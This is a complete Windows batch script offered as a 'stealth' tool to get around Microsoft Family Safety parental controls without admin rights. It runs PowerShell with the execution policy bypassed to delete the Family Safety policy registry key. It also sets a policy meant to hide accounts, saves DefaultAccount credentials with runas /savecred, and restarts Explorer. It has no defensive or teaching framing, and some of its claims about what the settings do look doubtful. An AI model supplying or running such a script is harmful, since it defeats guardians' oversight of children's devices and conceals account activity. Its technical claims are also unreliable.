@echo off
REM STEALTH DefaultAccount - NO ADMIN/FamilySafety bypass
REM Works even if disabled, pure HKCU

echo Bypassing FamilySafety...
powershell -ExecutionPolicy Bypass -Command ^
"$fsp = 'HKCU:\\Software\\Policies\\Microsoft\\Windows\\FamilySafety'; ^
if (Test-Path $fsp) { Remove-Item $fsp -Recurse -Force }; ^
Write-Host 'FamilySafety bypassed!'"

echo Hiding accounts...
powershell -ExecutionPolicy Bypass -Command ^
"$p = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer'; ^
New-Item $p -Force | Out-Null; ^
Set-ItemProperty $p 'NoUserAdmins' 1 -Force; ^
Write-Host 'Accounts hidden!'"

echo Save DefaultAccount creds ^(hack2024)...
runas /user:DefaultAccount /savecred "cmd /k echo Stealth DefaultAccount! ^(works if enabled^)"

echo Restart explorer...
taskkill /f /im explorer.exe & start explorer.exe

echo DONE! Win+R ^> runas /user:DefaultAccount cmd
pause
